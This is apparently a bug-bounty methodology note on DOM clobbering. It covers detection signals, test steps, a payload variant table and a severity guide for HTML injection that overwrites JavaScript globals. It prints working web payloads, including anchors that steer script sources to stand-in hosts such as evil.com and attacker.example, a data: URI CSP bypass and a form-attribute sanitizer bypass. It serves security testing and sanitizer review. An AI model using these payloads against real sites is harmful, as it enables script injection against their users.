---
type: pattern
title: Pattern - DOM Clobbering
tags: [pattern, cwe-79, cwe-1321, dom-clobbering, xss, csp-bypass, sanitizer-bypass, bb-pattern]
status: verified
vuln_class: dom-clobbering
severity_range: P1-P5
last_updated: 2026-06-03
---

# Pattern - DOM Clobbering — HTML Injection Overwriting JS Globals + Sanitizer Bypass

> When a page allows user-controlled HTML (a filter blocks `<script>` but permits `id` / `name` attributes on other tags), an attacker can use HTML elements to clobber JavaScript global objects, `document.cookie`, or `window.*` properties — upgrading an XSS-less injection into XSS, a CSP bypass, or behavior rewriting. The technique was systematized by Gareth Heyes (PortSwigger).

## Why This Is a Real Vulnerability, Not Noise

DOM clobbering exploits legacy HTML behavior: an element with an `id` or `name` attribute automatically gets mounted as `document.<id>` or `window.<id>`, and can override existing JS variables. When three conditions are met together (HTML injection + gadget property + sink), you can achieve script execution even when a filter has already blocked `<script>`, or bypass `strict-dynamic` CSP.

**Stop-loss rule**: all three conditions must be present to report this. Finding that a filter permits `<a id=x>` but not finding code that treats `window.x` as a sink is just an observation, not a vulnerability. `verification_level` needs to be `live`: you must be able to pop `alert(1)` or prove the sink was redirected to an attacker-controlled value; otherwise mark it `static` / `theoretical`.

---

## Summary

The core DOM-clobbering pattern:

1. The target page has an HTML injection point (a filter strips `<script>` but keeps tags like `<a>` / `<form>` / `<img>` / `<iframe>` that carry `id` / `name`)
2. Page JS does an "unprotected global lookup" such as `var cfg = window.config || {};` or `let cb = window.callback;`
3. The attacker injects HTML like `<a id=config name=url href=//evil/x.js>`, turning `window.config` into a DOM node whose `.url` becomes an attacker-controlled string
4. JS feeds that value into a sink (`script.src` / `location` / `innerHTML`) → XSS / external resource load / CSP bypass

An additional sanitizer-bypass pattern: clobbering `form.attributes` so a loop that scans attributes treats an `<input>` as a `NamedNodeMap`, causing the filter to misjudge and let subsequent malicious attributes through. Early versions of DOMPurify had this class of bypass (later patched with an instance check).

---

## Detection Signals

| Signal | Tool | Meaning |
|--------|------|---------|
| Filter permits non-`<script>` tags with `id` / `name` attributes | Inject `<a id=x>` / `<form id=y>` and check reflection | HTML injection surface exists |
| Code contains `window.X \|\| defaultValue` / `document.X` direct reads | Static analysis / DevTools Sources grep | Candidate gadget property |
| A sink accepts a value shaped like `obj.url` / `obj.src` / `obj.href` | grep `\.src\s*=`, `\.href\s*=`, `new Function(`, `eval(` | Candidate sink |
| `script.src = config.codeBasePath + ...`-style composition | DevTools / source map | Candidate CSP bypass (defeats nonce) |
| Sanitizer uses `for (const attr of el.attributes)` without an `instanceof NamedNodeMap` check | Read sanitizer source | DOMPurify-style attribute clobbering feasible |
| Burp DOM Invader reports a "clobbering candidate" | DOM Invader (Burp) | Automated canary detection hit |
| Service Worker / Web Worker consumes `globalThis.X` as a script URL string | grep `importScripts(`, `new Worker(` | Candidate Service Worker hijack |

---

## Test Methodology

### Step 0: Confirm the HTML injection boundary

```bash
# Determine which tags/attributes the sink accepts
# Inject the following payloads and observe what survives:
#   <a id=test>
#   <a id=test name=url href=//evil.com>
#   <form id=test><input id=attributes></form>
#   <img name=test src=x>
#   <iframe name=test src=//evil.com>
```

### Step 1: Clobber a global variable (gadget discovery)

After injection, confirm in the DevTools console:

```js
// confirm the clobber took effect
typeof window.test            // 'object' instead of undefined
window.test.url               // the href the attacker supplied
window.test.toString()        // usually returns the href string (HTMLAnchorElement coercion)
```

Two anchors sharing the same id → forms an HTMLCollection, letting you overwrite additional sub-properties:

```html
<a id=someObject><a id=someObject name=url href=//evil.com/x.js>
```

→ `window.someObject.url === '//evil.com/x.js'`.

### Step 2: Find a sink → end-to-end PoC

| Sink pattern | Injection | Expected effect |
|--------------|-----------|------------------|
| `var cfg = window.config \|\| {}; script.src = cfg.codeBasePath + 'app.js'` | `<a id=config><a id=config name=codeBasePath href=//evil/>` | `script.src = '//evil/app.js'` → XSS |
| `location = window.next \|\| '/'` | `<a id=next href=javascript:alert(1)>` | open redirect / `javascript:` URI |
| `eval(window.code)` | `<a id=code href="data:,alert(1)//">` | RCE-in-browser |
| `importScripts(self.swPath)` (Service Worker) | `<a id=swPath href=//evil/sw.js>` | Service Worker hijack (PortSwigger 2023 research) |

PortSwigger's published CSP bypass payload (targeting `strict-dynamic` + nonce):

```html
<a id=ehy><a id=ehy name=codeBasePath href=data:,alert(1)//>
```

Or a variant that avoids `data:`:

```html
<a id=ehy><a id=ehy name=codeBasePath href="//attacker.example/xss.js?">
```

### Step 3: Sanitizer attribute bypass (targeting the filter, not the app)

```html
<form onclick=alert(1)><input id=attributes>Click me
```

→ the filter's loop `for (const a of form.attributes)` receives the `<input>` instead of a NamedNodeMap; `length` is `undefined`, so the loop does nothing → the `onclick` attribute is never stripped → triggers on click.

To verify a sanitizer is safe:

```js
// safe pattern (current DOMPurify):
if (!(node.attributes instanceof NamedNodeMap)) reject();
```

### Step 4: Clobber `document.cookie` (rare but real)

```html
<img name=cookie src=x>
```

Some older libraries reading `document.cookie` for configuration get overridden by `<img name=cookie>` and receive an element instead of a string. In most modern browsers this vector is protected by the `[Replaceable]` IDL attribute; it's only feasible in quirks mode or with old libraries and must be dynamically verified.

---

## Variants / Common Bypass Techniques

| Technique | Injection sample | Prerequisite | Publicly documented by Heyes |
|-----------|-------------------|---------------|-------------------------------|
| Single `<a id=X>` clobber | `<a id=cfg href=//evil>` | Code reads `window.cfg` | Yes |
| Two `<a>` sharing an id (HTMLCollection) | `<a id=X><a id=X name=url href=//evil>` | Code reads `window.X.url` | Yes |
| `<form>` + nested `<input id=Y>` | `<form id=cfg><input id=url value=//evil>` | Code reads `cfg.url` (value coercion) | Yes |
| `<iframe name=X>` window clobber | `<iframe name=cfg src=//evil>` | Cross-frame variable lookup | Yes |
| `<img name=cookie>` | same as above | Old library reads `document.cookie` without going through the IDL accessor | Situational |
| Attribute clobber (filter bypass) | `<form><input id=attributes>` | Sanitizer loop over `el.attributes` with no instance check | Yes (early DOMPurify) |
| `tagName` / `nodeName` clobber | `<form><input id=tagName value=script>` | Sanitizer uses `node.tagName === 'SCRIPT'` | Yes |
| Service Worker `importScripts` hijack | `<a id=swPath name=src href=//evil/sw.js>` | SW reads a URL from `globalThis.swPath` | Yes (PortSwigger 2023) |
| CSP `strict-dynamic` bypass | `<a id=ehy><a id=ehy name=codeBasePath href=data:,alert(1)//>` | Nonce-protected script uses `script.src = X.codeBasePath` | Yes |
| `document.getElementById` redirection | `<form id=X><input id=X>` (duplicate id) | Code expects a single element | Fairly common |

---

## Severity Guide

| Condition | Severity | Notes |
|-----------|----------|-------|
| Clobber → `script.src` / `eval` / `new Function` → `alert(1)` fired (live) | P2 High | equivalent to reflected/stored XSS |
| Clobber bypasses `strict-dynamic` CSP (popup verified) | P1-P2 | XSS + CSP bypass in the same finding |
| Service Worker hijack (SW registration + clobber on the same origin, persistent browser-side RCE) | P1 Critical | takes over every fetch response for the victim's origin |
| Sanitizer attribute bypass (hits an old/self-written sanitizer) | P2-P3 | depends on downstream surface using that sanitizer |
| Clobber confirmed but the sink is benign (e.g. `console.log`) | P5 / do not report | no impact |
| Only found HTML injection permitting `id`, no sink found | Do not report | not all three conditions are met |
| Statically confirmed a `window.X \|\| {}` pattern but no end-to-end verification | `verification_level: B` | note the limitation, do not overclaim |

**Anti-overclaim reminder**: a DOM clobbering report must include a screenshot or HAR showing the sink actually firing (alert / external JS load). `typeof window.X === 'object'` alone is not a vulnerability — you need proof the sink was steered to an attacker-controlled value.

---

## Related

- [[Pattern - XSS]]
- [[Lessons Learned]] — pre-submission three-question filter (what can the attacker actually get / is this default behavior / what's left once you strip out theory)

### Sources

- PortSwigger Web Security Academy — DOM clobbering: <https://portswigger.net/web-security/dom-based/dom-clobbering>
- PortSwigger Research — Bypassing CSP via DOM clobbering (Gareth Heyes): <https://portswigger.net/research/bypassing-csp-via-dom-clobbering>
- PortSwigger Research — Hijacking service workers via DOM Clobbering: <https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering>
- HackTricks — DOM Clobbering: <https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/dom-clobbering.html>
- PayloadsAllTheThings — DOM Clobbering: <https://swisskyrepo.github.io/PayloadsAllTheThings/DOM%20Clobbering/>
